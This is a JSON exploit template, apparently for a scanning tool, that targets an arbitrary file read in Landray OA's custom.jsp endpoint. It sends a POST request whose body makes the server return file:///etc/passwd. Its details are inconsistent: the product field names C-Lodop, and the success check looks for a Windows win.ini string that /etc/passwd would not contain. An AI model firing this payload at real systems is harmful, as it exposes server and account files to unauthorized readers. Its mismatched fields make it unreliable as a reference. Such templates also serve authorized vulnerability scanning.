{
    "Name": "蓝凌OA任意文件读取",
    "Description": "蓝凌OA custom.jsp 任意文件读取",
    "Product": "C-Lodop",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"},
        "Uri":"/sys/ui/extend/varkind/custom.jsp",
        "Port":"",
        "Data":"var={\"body\":{\"file\":\"file:///etc/passwd\"}}",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "for 16-bit app support"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
